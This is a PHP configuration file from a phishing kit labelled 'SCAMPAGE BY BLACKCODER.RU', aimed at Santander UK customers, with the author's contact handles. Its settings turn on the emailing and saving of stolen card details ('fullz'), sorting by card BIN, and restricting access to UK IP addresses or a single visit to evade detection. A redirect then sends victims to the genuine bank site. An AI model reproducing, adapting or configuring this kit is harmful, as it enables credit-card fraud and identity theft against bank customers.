<?php
//SCAMPAGE BY BLACKCODER.RU
//Jabber: slackerz@jodo.im
//ICQ: 713566330


$binList = 0; //Scampage will make automatically binlist in logs/ called binlist.txt
$binSave = 0; //All fullz will be saved by BIN, example: All 123456 BIN's fullz will be saved into logs/123456.txt
$sendEmail = 1; //Results will be sent to your mail
$saveFile = 1; //Results will be saved into file (/logs)
$onlyUK = 0; //Scampage can be accessed just with UK IP if you put "1" instead "0" here.
$oneTimeAccess = 0; //Scampage can be accessed just one time if you put "1" instead "0" here.

$email = "outgoing@protonmail.com";
$redirect = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwj5krDg4q7gAhWUqHEKHQZfAXkQFjAAegQIAxAC&url=https%3A%2F%2Fwww.santander.co.uk%2Fuk&usg=AOvVaw2lrsOXzjiNjBJvvxRR9doR";
?>